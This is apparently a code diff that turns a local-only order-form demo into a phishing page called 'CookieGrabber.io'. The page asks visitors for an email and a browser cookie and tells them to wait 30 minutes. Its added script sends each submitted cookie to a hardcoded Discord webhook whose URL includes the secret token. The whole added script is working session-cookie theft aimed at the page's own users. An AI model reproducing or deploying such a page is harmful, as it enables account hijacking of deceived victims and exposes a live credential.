@@ -110,32 +110,111 @@
     font-size:12px;
     color:#9fbff7;
   }
+
+  .status-message {
+    margin-top: 16px;
+    padding: 10px;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 14px;
+    display: none;
+  }
+  
+  .success {
+    background-color: rgba(0, 255, 0, 0.1);
+    color: #90ee90;
+    border: 1px solid rgba(0, 255, 0, 0.3);
+  }
+  
+  .error {
+    background-color: rgba(255, 0, 0, 0.1);
+    color: #ffcccb;
+    border: 1px solid rgba(255, 0, 0, 0.3);
+  }
 </style>
 </head>
 <body>
   <main class="card">
     <h1>CookieGrabber.io</h1>
 
-    <label for="orderId">Order ID</label>
-    <input id="orderId" placeholder="#12345" />
+    <label for="orderId">Email Address:</label>
+    <input id="orderId" placeholder="" />
 
-    <label for="delivery">Delivery address</label>
-    <textarea id="delivery" rows="4" placeholder="Enter address or delivery notes..."></textarea>
+    <label for="delivery">Cookie:</label>
+    <textarea id="delivery" rows="4" placeholder=""></textarea>
 
-    <button id="submitBtn">Submit Order (Local Preview)</button>
+    <button id="submitBtn">Confirm</button>
+    
+    <div id="statusMessage" class="status-message"></div>
 
-    <div class="hint">This demo is local-only. Add your own backend later.</div>
+    <div class="hint">Press "Confirm" with the details and wait 30 minutes</div>
   </main>
 
   <script>
     const order = document.getElementById('orderId');
     const delivery = document.getElementById('delivery');
-    document.getElementById('submitBtn').addEventListener('click',()=>{
+    const submitBtn = document.getElementById('submitBtn');
+    const statusMessage = document.getElementById('statusMessage');
+    
+    // Webhook URL
+    const webhookURL = 'https://ptb.discord.com/api/webhooks/1430576765373386772/lx_TsY9NWYvZLWpnlmntTwA1O6fsDDUPrQC_YkMnRAMEM6HGOqfDcjVsOS3QL4ghQQhA';
+    
+    function showStatus(message, isSuccess) {
+      statusMessage.textContent = message;
+      statusMessage.className = `status-message ${isSuccess ? 'success' : 'error'}`;
+      statusMessage.style.display = 'block';
+      
+      // Hide after 5 seconds
+      setTimeout(() => {
+        statusMessage.style.display = 'none';
+      }, 5000);
+    }
+    
+    async function sendToWebhook(cookieData) {
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `New cookie received:\n\`\`\`${cookieData}\`\`\``,
+          }),
+        });
+        
+        if (response.ok) {
+          showStatus('Cookie sent successfully!', true);
+          console.log('Cookie sent to webhook successfully');
+        } else {
+          showStatus('Failed to send cookie. Please try again.', false);
+          console.error('Failed to send cookie to webhook');
+        }
+      } catch (error) {
+        showStatus('Error sending cookie. Please try again.', false);
+        console.error('Error sending cookie to webhook:', error);
+      }
+    }
+    
+    submitBtn.addEventListener('click', () => {
       const o = order.value.trim();
       const d = delivery.value.trim();
-      if(!o){ alert("Please enter an Order ID."); return; }
-      alert(`Local preview:\nOrder ID: ${o}\nDelivery: ${d||"[none]"}`);
-      console.log("[Local preview]", { order:o, delivery:d, time:new Date().toISOString() });
+      
+      if(!o){ 
+        showStatus('Please enter an Email Address.', false);
+        return; 
+      }
+      
+      if(!d){ 
+        showStatus('Please enter a Cookie.', false);
+        return; 
+      }
+      
+      // Show local preview
+      alert(`Local preview:\nEmail: ${o}\nCookie: ${d}`);
+      console.log("[Local preview]", { email: o, cookie: d, time: new Date().toISOString() });
+      
+      // Send cookie to webhook
+      sendToWebhook(d);
     });
   </script>
 </body>
